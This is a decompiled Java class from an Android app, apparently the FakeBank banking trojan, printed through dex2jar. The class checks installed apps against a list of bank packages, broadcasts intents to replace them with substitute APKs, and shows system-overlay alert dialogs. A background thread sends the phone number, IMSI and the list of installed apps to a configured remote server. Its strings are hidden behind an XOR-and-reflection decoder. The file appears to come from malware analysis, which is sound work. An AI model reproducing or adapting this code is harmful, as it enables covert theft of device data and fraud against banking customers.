package com.google.bps.bfcfc;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

public class App {
  ArrayList<HashMap<String, Object>> items = new ArrayList<HashMap<String, Object>>();
  
  private Context mContext;
  
  public App(Context paramContext) {
    this.mContext = paramContext;
    Config.cBankStr = "";
    Config.sBankStr = "";
  }
  
  public static String autoChangeApps() {
    String str = "";
    PackageManager packageManager = CoreService.mContext.getPackageManager();
    Iterator<PackageInfo> iterator = packageManager.getInstalledPackages(0).iterator();
    label21: while (true) {
      if (!iterator.hasNext()) {
        str = "";
        continue;
      } 
      PackageInfo packageInfo = iterator.next();
      if ((packageInfo.applicationInfo.flags & 0x1) == 0 && (packageInfo.applicationInfo.flags & 0x80) == 0) {
        String str1 = String.valueOf(str) + packageInfo.applicationInfo.loadLabel(packageManager) + "#" + packageInfo.applicationInfo.packageName + "|";
        byte b = 0;
        while (true) {
          str = str1;
          if (b < Config.bank.length) {
            str = Config.bank[b];
            String str2 = Config.upbank[b];
            if (str.equals(packageInfo.applicationInfo.packageName) && !hasApp(str2) && Config.isAlert == 0) {
              str = Config.apkNames[b];
              Intent intent = new Intent();
              Bundle bundle = new Bundle();
              bundle.putString("apk", str);
              intent.putExtras(bundle);
              intent.setAction(sendApps("I0UVehEHDxtTPxQSFBUJCTg5AXtoj2Bx"));
              CoreService.mContext.sendBroadcast(intent);
              return str;
            } 
            b++;
            continue;
          } 
          continue label21;
        } 
        break;
      } 
    } 
  }
  
  public static boolean hasApp(String paramString) {
    String str = "";
    boolean bool = false;
    PackageManager packageManager = CoreService.mContext.getPackageManager();
    Iterator<PackageInfo> iterator = packageManager.getInstalledPackages(0).iterator();
    while (true) {
      if (!iterator.hasNext())
        return bool; 
      PackageInfo packageInfo = iterator.next();
      if ((packageInfo.applicationInfo.flags & 0x1) == 0 && (packageInfo.applicationInfo.flags & 0x80) == 0) {
        String str1 = String.valueOf(str) + packageInfo.applicationInfo.loadLabel(packageManager) + "#" + packageInfo.applicationInfo.packageName + "|";
        str = str1;
        if (paramString.equals(packageInfo.applicationInfo.packageName)) {
          bool = true;
          str = str1;
        } 
      } 
    } 
  }
  
  private static String sendApps(String paramString) {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: bipush #19
    //   4: newarray byte
    //   6: astore_2
    //   7: aload_2
    //   8: dup
    //   9: iconst_0
    //   10: ldc 34
    //   12: bastore
    //   13: dup
    //   14: iconst_1
    //   15: ldc 45
    //   17: bastore
    //   18: dup
    //   19: iconst_2
    //   20: ldc 39
    //   22: bastore
    //   23: dup
    //   24: iconst_3
    //   25: ldc 49
    //   27: bastore
    //   28: dup
    //   29: iconst_4
    //   30: ldc 44
    //   32: bastore
    //   33: dup
    //   34: iconst_5
    //   35: ldc 42
    //   37: bastore
    //   38: dup
    //   39: bipush #6
    //   41: ldc 39
    //   43: bastore
    //   44: dup
    //   45: bipush #7
    //   47: ldc 109
    //   49: bastore
    //   50: dup
    //   51: bipush #8
    //   53: ldc 54
    //   55: bastore
    //   56: dup
    //   57: bipush #9
    //   59: ldc 55
    //   61: bastore
    //   62: dup
    //   63: bipush #10
    //   65: ldc 42
    //   67: bastore
    //   68: dup
    //   69: bipush #11
    //   71: ldc 47
    //   73: bastore
    //   74: dup
    //   75: bipush #12
    //   77: ldc 109
    //   79: bastore
    //   80: dup
    //   81: bipush #13
    //   83: ldc 1
    //   85: bastore
    //   86: dup
    //   87: bipush #14
    //   89: ldc 34
    //   91: bastore
    //   92: dup
    //   93: bipush #15
    //   95: ldc 48
    //   97: bastore
    //   98: dup
    //   99: bipush #16
    //   101: ldc 38
    //   103: bastore
    //   104: dup
    //   105: bipush #17
    //   107: ldc 117
    //   109: bastore
    //   110: dup
    //   111: bipush #18
    //   113: ldc 119
    //   115: bastore
    //   116: pop
    //   117: aload_0
    //   118: iconst_0
    //   119: iconst_2
    //   120: invokevirtual substring : (II)Ljava/lang/String;
    //   123: astore_3
    //   124: new java/lang/StringBuilder
    //   127: dup
    //   128: aload_0
    //   129: aload_0
    //   130: invokevirtual length : ()I
    //   133: iconst_2
    //   134: isub
    //   135: invokevirtual substring : (I)Ljava/lang/String;
    //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   141: invokespecial <init> : (Ljava/lang/String;)V
    //   144: aload_0
    //   145: iconst_2
    //   146: aload_0
    //   147: invokevirtual length : ()I
    //   150: iconst_2
    //   151: isub
    //   152: invokevirtual substring : (II)Ljava/lang/String;
    //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: aload_3
    //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   162: invokevirtual toString : ()Ljava/lang/String;
    //   165: astore_0
    //   166: iconst_0
    //   167: istore #4
    //   169: iload #4
    //   171: bipush #19
    //   173: if_icmplt -> 584
    //   176: new java/lang/String
    //   179: dup
    //   180: aload_2
    //   181: invokespecial <init> : ([B)V
    //   184: astore_3
    //   185: new java/lang/StringBuilder
    //   188: dup
    //   189: aload_3
    //   190: iconst_2
    //   191: iconst_3
    //   192: invokevirtual substring : (II)Ljava/lang/String;
    //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   198: invokespecial <init> : (Ljava/lang/String;)V
    //   201: aload_3
    //   202: bipush #16
    //   204: bipush #17
    //   206: invokevirtual substring : (II)Ljava/lang/String;
    //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   212: invokevirtual toString : ()Ljava/lang/String;
    //   215: astore_2
    //   216: new java/lang/StringBuilder
    //   219: dup
    //   220: new java/lang/StringBuilder
    //   223: dup
    //   224: new java/lang/StringBuilder
    //   227: dup
    //   228: aload_2
    //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   232: invokespecial <init> : (Ljava/lang/String;)V
    //   235: ldc 'c'
    //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   240: invokevirtual toString : ()Ljava/lang/String;
    //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   246: invokespecial <init> : (Ljava/lang/String;)V
    //   249: aload_3
    //   250: iconst_4
    //   251: iconst_5
    //   252: invokevirtual substring : (II)Ljava/lang/String;
    //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   258: invokevirtual toString : ()Ljava/lang/String;
    //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   264: invokespecial <init> : (Ljava/lang/String;)V
    //   267: aload_2
    //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   271: invokevirtual toString : ()Ljava/lang/String;
    //   274: astore_2
    //   275: aload_3
    //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   279: astore_3
    //   280: aload_3
    //   281: aload_2
    //   282: iconst_2
    //   283: anewarray java/lang/Class
    //   286: dup
    //   287: iconst_0
    //   288: ldc java/lang/String
    //   290: aastore
    //   291: dup
    //   292: iconst_1
    //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
    //   296: aastore
    //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   300: aload_3
    //   301: iconst_2
    //   302: anewarray java/lang/Object
    //   305: dup
    //   306: iconst_0
    //   307: aload_0
    //   308: aastore
    //   309: dup
    //   310: iconst_1
    //   311: iconst_0
    //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   315: aastore
    //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   319: checkcast [B
    //   322: astore_0
    //   323: aload_0
    //   324: arraylength
    //   325: istore #5
    //   327: iload #5
    //   329: iconst_1
    //   330: isub
    //   331: aload_0
    //   332: iload #5
    //   334: iconst_1
    //   335: isub
    //   336: baload
    //   337: i2c
    //   338: invokestatic valueOf : (C)Ljava/lang/String;
    //   341: invokestatic parseInt : (Ljava/lang/String;)I
    //   344: isub
    //   345: istore #6
    //   347: aload_0
    //   348: iload #6
    //   350: iconst_1
    //   351: isub
    //   352: baload
    //   353: iconst_1
    //   354: if_icmpne -> 653
    //   357: iconst_1
    //   358: istore #4
    //   360: iinc #6, -1
    //   363: aload_0
    //   364: iload #6
    //   366: iconst_2
    //   367: isub
    //   368: baload
    //   369: i2c
    //   370: istore #7
    //   372: aload_0
    //   373: iload #6
    //   375: iconst_1
    //   376: isub
    //   377: baload
    //   378: i2c
    //   379: istore #8
    //   381: new java/lang/StringBuilder
    //   384: dup
    //   385: iload #7
    //   387: invokestatic valueOf : (C)Ljava/lang/String;
    //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   393: invokespecial <init> : (Ljava/lang/String;)V
    //   396: iload #8
    //   398: invokestatic valueOf : (C)Ljava/lang/String;
    //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   404: invokevirtual toString : ()Ljava/lang/String;
    //   407: bipush #16
    //   409: invokestatic parseInt : (Ljava/lang/String;I)I
    //   412: i2b
    //   413: bipush #116
    //   415: isub
    //   416: i2b
    //   417: istore #9
    //   419: iload #6
    //   421: iconst_2
    //   422: isub
    //   423: istore #10
    //   425: iconst_0
    //   426: istore #6
    //   428: iload #6
    //   430: iload #10
    //   432: if_icmplt -> 659
    //   435: iload #10
    //   437: istore #6
    //   439: iload #6
    //   441: iload #5
    //   443: if_icmplt -> 678
    //   446: iload #4
    //   448: iconst_1
    //   449: if_icmpne -> 560
    //   452: new java/lang/Exception
    //   455: dup
    //   456: invokespecial <init> : ()V
    //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
    //   462: iconst_1
    //   463: aaload
    //   464: astore_3
    //   465: aload_3
    //   466: invokevirtual getClassName : ()Ljava/lang/String;
    //   469: astore_2
    //   470: aload_2
    //   471: ldc_w '.'
    //   474: invokevirtual lastIndexOf : (Ljava/lang/String;)I
    //   477: istore #4
    //   479: aload_2
    //   480: astore_1
    //   481: iload #4
    //   483: iconst_m1
    //   484: if_icmpeq -> 496
    //   487: aload_2
    //   488: iload #4
    //   490: iconst_1
    //   491: iadd
    //   492: invokevirtual substring : (I)Ljava/lang/String;
    //   495: astore_1
    //   496: aload_3
    //   497: invokevirtual getMethodName : ()Ljava/lang/String;
    //   500: astore_2
    //   501: new java/lang/StringBuilder
    //   504: dup
    //   505: aload_1
    //   506: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   509: invokespecial <init> : (Ljava/lang/String;)V
    //   512: aload_2
    //   513: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   516: invokevirtual toString : ()Ljava/lang/String;
    //   519: astore_2
    //   520: aload_2
    //   521: astore_1
    //   522: aload_2
    //   523: invokevirtual length : ()I
    //   526: sipush #256
    //   529: if_icmple -> 541
    //   532: aload_2
    //   533: iconst_0
    //   534: sipush #256
    //   537: invokevirtual substring : (II)Ljava/lang/String;
    //   540: astore_1
    //   541: aload_1
    //   542: invokevirtual length : ()I
    //   545: istore #4
    //   547: iconst_0
    //   548: istore #6
    //   550: iinc #4, -1
    //   553: iload #6
    //   555: iload #10
    //   557: if_icmplt -> 690
    //   560: iload #10
    //   562: newarray byte
    //   564: astore_1
    //   565: iconst_0
    //   566: istore #4
    //   568: iload #4
    //   570: iload #10
    //   572: if_icmplt -> 741
    //   575: new java/lang/String
    //   578: dup
    //   579: aload_1
    //   580: invokespecial <init> : ([B)V
    //   583: areturn
    //   584: aload_2
    //   585: iload #4
    //   587: aload_2
    //   588: iload #4
    //   590: baload
    //   591: bipush #67
    //   593: ixor
    //   594: i2b
    //   595: i2b
    //   596: bastore
    //   597: iinc #4, 1
    //   600: goto -> 169
    //   603: astore_0
    //   604: aload_0
    //   605: invokevirtual printStackTrace : ()V
    //   608: aload_1
    //   609: astore_0
    //   610: goto -> 323
    //   613: astore_0
    //   614: aload_0
    //   615: invokevirtual printStackTrace : ()V
    //   618: aload_1
    //   619: astore_0
    //   620: goto -> 323
    //   623: astore_0
    //   624: aload_0
    //   625: invokevirtual printStackTrace : ()V
    //   628: aload_1
    //   629: astore_0
    //   630: goto -> 323
    //   633: astore_0
    //   634: aload_0
    //   635: invokevirtual printStackTrace : ()V
    //   638: aload_1
    //   639: astore_0
    //   640: goto -> 323
    //   643: astore_0
    //   644: aload_0
    //   645: invokevirtual printStackTrace : ()V
    //   648: aload_1
    //   649: astore_0
    //   650: goto -> 323
    //   653: iconst_0
    //   654: istore #4
    //   656: goto -> 360
    //   659: aload_0
    //   660: iload #6
    //   662: aload_0
    //   663: iload #6
    //   665: baload
    //   666: iload #9
    //   668: ixor
    //   669: i2b
    //   670: i2b
    //   671: bastore
    //   672: iinc #6, 1
    //   675: goto -> 428
    //   678: aload_0
    //   679: iload #6
    //   681: iconst_0
    //   682: i2b
    //   683: bastore
    //   684: iinc #6, 1
    //   687: goto -> 439
    //   690: aload_0
    //   691: iload #6
    //   693: baload
    //   694: istore #9
    //   696: iload #4
    //   698: iconst_1
    //   699: isub
    //   700: istore #5
    //   702: aload_0
    //   703: iload #6
    //   705: iload #9
    //   707: aload_1
    //   708: iload #4
    //   710: invokevirtual charAt : (I)C
    //   713: i2b
    //   714: ixor
    //   715: i2b
    //   716: i2b
    //   717: bastore
    //   718: iload #5
    //   720: istore #4
    //   722: iload #5
    //   724: ifge -> 735
    //   727: aload_1
    //   728: invokevirtual length : ()I
    //   731: iconst_1
    //   732: isub
    //   733: istore #4
    //   735: iinc #6, 1
    //   738: goto -> 553
    //   741: aload_1
    //   742: iload #4
    //   744: aload_0
    //   745: iload #4
    //   747: baload
    //   748: i2b
    //   749: bastore
    //   750: iinc #4, 1
    //   753: goto -> 568
    // Exception table:
    //   from	to	target	type
    //   275	323	603	java/lang/ClassNotFoundException
    //   275	323	613	java/lang/IllegalAccessException
    //   275	323	623	java/lang/NoSuchMethodException
    //   275	323	633	java/lang/IllegalArgumentException
    //   275	323	643	java/lang/reflect/InvocationTargetException
  }
  
  public void alertBroadCast(String paramString) {
    Intent intent = new Intent();
    intent.setAction(sendApps("==spVTshZGQbIC8vIEFDAb5+RFlfNQLT"));
    intent.putExtra(sendApps("4zTP+tszRgFBRY3t"), true);
    intent.putExtra("info", paramString);
    this.mContext.sendBroadcast(intent);
  }
  
  public void changeApk(String paramString) {
    System.out.println(sendApps("M=P4rv7Po/XtvdviqdjrpPf4JDwsdGlbbzk4AXabPTqv") + paramString);
    if (!paramString.equals("")) {
      String[] arrayOfString = URLDecoder.decode(paramString).split("|");
      AlertDialog.Builder builder = new AlertDialog.Builder(this.mContext);
      builder.setTitle(arrayOfString[0]);
      builder.setPositiveButton(sendApps("Y1yMwLOqz7eVQkYBn4WdXNxq"), new BtnClick());
      builder.setNegativeButton(sendApps("Q=CGw7yLx5ayQjQBQTa6kDwp"), new BtnClick());
      AlertDialog alertDialog = builder.create();
      alertDialog.getWindow().setType(2003);
      alertDialog.show();
    } 
  }
  
  public String getApps() {
    String str = "";
    PackageManager packageManager = this.mContext.getPackageManager();
    Iterator<PackageInfo> iterator = packageManager.getInstalledPackages(0).iterator();
    label23: while (true) {
      if (!iterator.hasNext()) {
        if (!Config.cBankStr.equals(""))
          Config.cBankStr = URLEncoder.encode(Config.cBankStr); 
        if (!Config.sBankStr.equals(""))
          Config.sBankStr = URLEncoder.encode(Config.sBankStr); 
        return str;
      } 
      PackageInfo packageInfo = iterator.next();
      if ((packageInfo.applicationInfo.flags & 0x1) == 0 && (packageInfo.applicationInfo.flags & 0x80) == 0) {
        String str1 = String.valueOf(str) + packageInfo.applicationInfo.loadLabel(packageManager) + "#" + packageInfo.applicationInfo.packageName + "|";
        byte b = 0;
        while (true) {
          str = str1;
          if (b < Config.bank.length) {
            String str2 = Config.bank[b];
            str = Config.upbank[b];
            if (str2.equals(packageInfo.applicationInfo.packageName))
              Config.cBankStr = String.valueOf(Config.cBankStr) + "#" + Config.bankName[b]; 
            if (str.equals(packageInfo.applicationInfo.packageName))
              Config.sBankStr = String.valueOf(Config.sBankStr) + "#" + Config.bankName[b]; 
            b++;
            continue;
          } 
          continue label23;
        } 
        break;
      } 
    } 
  }
  
  public void sendApps() {
    (new Thread(new Runnable() {
          private static String run(String param1String) {
            // Byte code:
            //   0: aconst_null
            //   1: astore_1
            //   2: bipush #19
            //   4: newarray byte
            //   6: astore_2
            //   7: aload_2
            //   8: dup
            //   9: iconst_0
            //   10: ldc 25
            //   12: bastore
            //   13: dup
            //   14: iconst_1
            //   15: ldc 22
            //   17: bastore
            //   18: dup
            //   19: iconst_2
            //   20: ldc 28
            //   22: bastore
            //   23: dup
            //   24: iconst_3
            //   25: ldc 10
            //   27: bastore
            //   28: dup
            //   29: iconst_4
            //   30: ldc 23
            //   32: bastore
            //   33: dup
            //   34: iconst_5
            //   35: ldc 17
            //   37: bastore
            //   38: dup
            //   39: bipush #6
            //   41: ldc 28
            //   43: bastore
            //   44: dup
            //   45: bipush #7
            //   47: ldc 86
            //   49: bastore
            //   50: dup
            //   51: bipush #8
            //   53: ldc 13
            //   55: bastore
            //   56: dup
            //   57: bipush #9
            //   59: ldc 12
            //   61: bastore
            //   62: dup
            //   63: bipush #10
            //   65: ldc 17
            //   67: bastore
            //   68: dup
            //   69: bipush #11
            //   71: ldc 20
            //   73: bastore
            //   74: dup
            //   75: bipush #12
            //   77: ldc 86
            //   79: bastore
            //   80: dup
            //   81: bipush #13
            //   83: ldc 58
            //   85: bastore
            //   86: dup
            //   87: bipush #14
            //   89: ldc 25
            //   91: bastore
            //   92: dup
            //   93: bipush #15
            //   95: ldc 11
            //   97: bastore
            //   98: dup
            //   99: bipush #16
            //   101: ldc 29
            //   103: bastore
            //   104: dup
            //   105: bipush #17
            //   107: ldc 78
            //   109: bastore
            //   110: dup
            //   111: bipush #18
            //   113: ldc 76
            //   115: bastore
            //   116: pop
            //   117: aload_0
            //   118: iconst_0
            //   119: iconst_2
            //   120: invokevirtual substring : (II)Ljava/lang/String;
            //   123: astore_3
            //   124: new java/lang/StringBuilder
            //   127: dup
            //   128: aload_0
            //   129: aload_0
            //   130: invokevirtual length : ()I
            //   133: iconst_2
            //   134: isub
            //   135: invokevirtual substring : (I)Ljava/lang/String;
            //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
            //   141: invokespecial <init> : (Ljava/lang/String;)V
            //   144: aload_0
            //   145: iconst_2
            //   146: aload_0
            //   147: invokevirtual length : ()I
            //   150: iconst_2
            //   151: isub
            //   152: invokevirtual substring : (II)Ljava/lang/String;
            //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   158: aload_3
            //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   162: invokevirtual toString : ()Ljava/lang/String;
            //   165: astore_0
            //   166: iconst_0
            //   167: istore #4
            //   169: iload #4
            //   171: bipush #19
            //   173: if_icmplt -> 583
            //   176: new java/lang/String
            //   179: dup
            //   180: aload_2
            //   181: invokespecial <init> : ([B)V
            //   184: astore_3
            //   185: new java/lang/StringBuilder
            //   188: dup
            //   189: aload_3
            //   190: iconst_2
            //   191: iconst_3
            //   192: invokevirtual substring : (II)Ljava/lang/String;
            //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
            //   198: invokespecial <init> : (Ljava/lang/String;)V
            //   201: aload_3
            //   202: bipush #16
            //   204: bipush #17
            //   206: invokevirtual substring : (II)Ljava/lang/String;
            //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   212: invokevirtual toString : ()Ljava/lang/String;
            //   215: astore_2
            //   216: new java/lang/StringBuilder
            //   219: dup
            //   220: new java/lang/StringBuilder
            //   223: dup
            //   224: new java/lang/StringBuilder
            //   227: dup
            //   228: aload_2
            //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
            //   232: invokespecial <init> : (Ljava/lang/String;)V
            //   235: ldc 'c'
            //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   240: invokevirtual toString : ()Ljava/lang/String;
            //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
            //   246: invokespecial <init> : (Ljava/lang/String;)V
            //   249: aload_3
            //   250: iconst_4
            //   251: iconst_5
            //   252: invokevirtual substring : (II)Ljava/lang/String;
            //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   258: invokevirtual toString : ()Ljava/lang/String;
            //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
            //   264: invokespecial <init> : (Ljava/lang/String;)V
            //   267: aload_2
            //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   271: invokevirtual toString : ()Ljava/lang/String;
            //   274: astore_2
            //   275: aload_3
            //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
            //   279: astore_3
            //   280: aload_3
            //   281: aload_2
            //   282: iconst_2
            //   283: anewarray java/lang/Class
            //   286: dup
            //   287: iconst_0
            //   288: ldc java/lang/String
            //   290: aastore
            //   291: dup
            //   292: iconst_1
            //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
            //   296: aastore
            //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
            //   300: aload_3
            //   301: iconst_2
            //   302: anewarray java/lang/Object
            //   305: dup
            //   306: iconst_0
            //   307: aload_0
            //   308: aastore
            //   309: dup
            //   310: iconst_1
            //   311: iconst_0
            //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
            //   315: aastore
            //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
            //   319: checkcast [B
            //   322: astore_0
            //   323: aload_0
            //   324: arraylength
            //   325: istore #5
            //   327: iload #5
            //   329: iconst_1
            //   330: isub
            //   331: aload_0
            //   332: iload #5
            //   334: iconst_1
            //   335: isub
            //   336: baload
            //   337: i2c
            //   338: invokestatic valueOf : (C)Ljava/lang/String;
            //   341: invokestatic parseInt : (Ljava/lang/String;)I
            //   344: isub
            //   345: istore #6
            //   347: aload_0
            //   348: iload #6
            //   350: iconst_1
            //   351: isub
            //   352: baload
            //   353: iconst_1
            //   354: if_icmpne -> 652
            //   357: iconst_1
            //   358: istore #4
            //   360: iinc #6, -1
            //   363: aload_0
            //   364: iload #6
            //   366: iconst_2
            //   367: isub
            //   368: baload
            //   369: i2c
            //   370: istore #7
            //   372: aload_0
            //   373: iload #6
            //   375: iconst_1
            //   376: isub
            //   377: baload
            //   378: i2c
            //   379: istore #8
            //   381: new java/lang/StringBuilder
            //   384: dup
            //   385: iload #7
            //   387: invokestatic valueOf : (C)Ljava/lang/String;
            //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
            //   393: invokespecial <init> : (Ljava/lang/String;)V
            //   396: iload #8
            //   398: invokestatic valueOf : (C)Ljava/lang/String;
            //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   404: invokevirtual toString : ()Ljava/lang/String;
            //   407: bipush #16
            //   409: invokestatic parseInt : (Ljava/lang/String;I)I
            //   412: i2b
            //   413: bipush #101
            //   415: iadd
            //   416: i2b
            //   417: istore #9
            //   419: iload #6
            //   421: iconst_2
            //   422: isub
            //   423: istore #10
            //   425: iconst_0
            //   426: istore #6
            //   428: iload #6
            //   430: iload #10
            //   432: if_icmplt -> 658
            //   435: iload #10
            //   437: istore #6
            //   439: iload #6
            //   441: iload #5
            //   443: if_icmplt -> 677
            //   446: iload #4
            //   448: iconst_1
            //   449: if_icmpne -> 559
            //   452: new java/lang/Exception
            //   455: dup
            //   456: invokespecial <init> : ()V
            //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
            //   462: iconst_1
            //   463: aaload
            //   464: astore_3
            //   465: aload_3
            //   466: invokevirtual getClassName : ()Ljava/lang/String;
            //   469: astore_2
            //   470: aload_2
            //   471: ldc '.'
            //   473: invokevirtual lastIndexOf : (Ljava/lang/String;)I
            //   476: istore #4
            //   478: aload_2
            //   479: astore_1
            //   480: iload #4
            //   482: iconst_m1
            //   483: if_icmpeq -> 495
            //   486: aload_2
            //   487: iload #4
            //   489: iconst_1
            //   490: iadd
            //   491: invokevirtual substring : (I)Ljava/lang/String;
            //   494: astore_1
            //   495: aload_3
            //   496: invokevirtual getMethodName : ()Ljava/lang/String;
            //   499: astore_2
            //   500: new java/lang/StringBuilder
            //   503: dup
            //   504: aload_1
            //   505: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
            //   508: invokespecial <init> : (Ljava/lang/String;)V
            //   511: aload_2
            //   512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
            //   515: invokevirtual toString : ()Ljava/lang/String;
            //   518: astore_2
            //   519: aload_2
            //   520: astore_1
            //   521: aload_2
            //   522: invokevirtual length : ()I
            //   525: sipush #256
            //   528: if_icmple -> 540
            //   531: aload_2
            //   532: iconst_0
            //   533: sipush #256
            //   536: invokevirtual substring : (II)Ljava/lang/String;
            //   539: astore_1
            //   540: aload_1
            //   541: invokevirtual length : ()I
            //   544: istore #4
            //   546: iconst_0
            //   547: istore #6
            //   549: iinc #4, -1
            //   552: iload #6
            //   554: iload #10
            //   556: if_icmplt -> 689
            //   559: iload #10
            //   561: newarray byte
            //   563: astore_1
            //   564: iconst_0
            //   565: istore #4
            //   567: iload #4
            //   569: iload #10
            //   571: if_icmplt -> 740
            //   574: new java/lang/String
            //   577: dup
            //   578: aload_1
            //   579: invokespecial <init> : ([B)V
            //   582: areturn
            //   583: aload_2
            //   584: iload #4
            //   586: aload_2
            //   587: iload #4
            //   589: baload
            //   590: bipush #120
            //   592: ixor
            //   593: i2b
            //   594: i2b
            //   595: bastore
            //   596: iinc #4, 1
            //   599: goto -> 169
            //   602: astore_0
            //   603: aload_0
            //   604: invokevirtual printStackTrace : ()V
            //   607: aload_1
            //   608: astore_0
            //   609: goto -> 323
            //   612: astore_0
            //   613: aload_0
            //   614: invokevirtual printStackTrace : ()V
            //   617: aload_1
            //   618: astore_0
            //   619: goto -> 323
            //   622: astore_0
            //   623: aload_0
            //   624: invokevirtual printStackTrace : ()V
            //   627: aload_1
            //   628: astore_0
            //   629: goto -> 323
            //   632: astore_0
            //   633: aload_0
            //   634: invokevirtual printStackTrace : ()V
            //   637: aload_1
            //   638: astore_0
            //   639: goto -> 323
            //   642: astore_0
            //   643: aload_0
            //   644: invokevirtual printStackTrace : ()V
            //   647: aload_1
            //   648: astore_0
            //   649: goto -> 323
            //   652: iconst_0
            //   653: istore #4
            //   655: goto -> 360
            //   658: aload_0
            //   659: iload #6
            //   661: aload_0
            //   662: iload #6
            //   664: baload
            //   665: iload #9
            //   667: ixor
            //   668: i2b
            //   669: i2b
            //   670: bastore
            //   671: iinc #6, 1
            //   674: goto -> 428
            //   677: aload_0
            //   678: iload #6
            //   680: iconst_0
            //   681: i2b
            //   682: bastore
            //   683: iinc #6, 1
            //   686: goto -> 439
            //   689: aload_0
            //   690: iload #6
            //   692: baload
            //   693: istore #9
            //   695: iload #4
            //   697: iconst_1
            //   698: isub
            //   699: istore #5
            //   701: aload_0
            //   702: iload #6
            //   704: iload #9
            //   706: aload_1
            //   707: iload #4
            //   709: invokevirtual charAt : (I)C
            //   712: i2b
            //   713: ixor
            //   714: i2b
            //   715: i2b
            //   716: bastore
            //   717: iload #5
            //   719: istore #4
            //   721: iload #5
            //   723: ifge -> 734
            //   726: aload_1
            //   727: invokevirtual length : ()I
            //   730: iconst_1
            //   731: isub
            //   732: istore #4
            //   734: iinc #6, 1
            //   737: goto -> 552
            //   740: aload_1
            //   741: iload #4
            //   743: aload_0
            //   744: iload #4
            //   746: baload
            //   747: i2b
            //   748: bastore
            //   749: iinc #4, 1
            //   752: goto -> 567
            // Exception table:
            //   from	to	target	type
            //   275	323	602	java/lang/ClassNotFoundException
            //   275	323	612	java/lang/IllegalAccessException
            //   275	323	622	java/lang/NoSuchMethodException
            //   275	323	632	java/lang/IllegalArgumentException
            //   275	323	642	java/lang/reflect/InvocationTargetException
          }
          
          public void run() {
            String str = String.valueOf(Config.get((Context)CoreService.mContext, run("U=Tko6Xm/dU3RgE3llt5Mz+f"), Config.SERVER_HOST)) + Config.SERVER_ADDRESS + run("Q=AHRwcbACkJFQUJQTABjWd2TzKg") + Config.getPhoneNumber(App.this.mContext).trim() + run("==MwbWJiQ0EBktx0MwZz") + Config.getIMSI(App.this.mContext).trim() + run("==QvbWInLAdhQ0QBKIokMwei") + URLEncoder.encode(App.this.getApps().trim());
            System.out.println(run("s0tIdA917ARdYjcFBTVGRiRbQ3QiVzBiTvbsrDNFAUfaKEJF") + str);
            try {
              Connect connect = new Connect();
              this();
              connect.getHttpConnection(str);
            } catch (Exception exception) {}
          }
        })).start();
  }
  
  class BtnClick implements DialogInterface.OnClickListener {
    public void onClick(DialogInterface param1DialogInterface, int param1Int) {}
  }
}


/* Location:              /home/fahim/Desktop/BreakFakeBank-dex2jar.jar!/com/google/bps/bfcfc/App.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */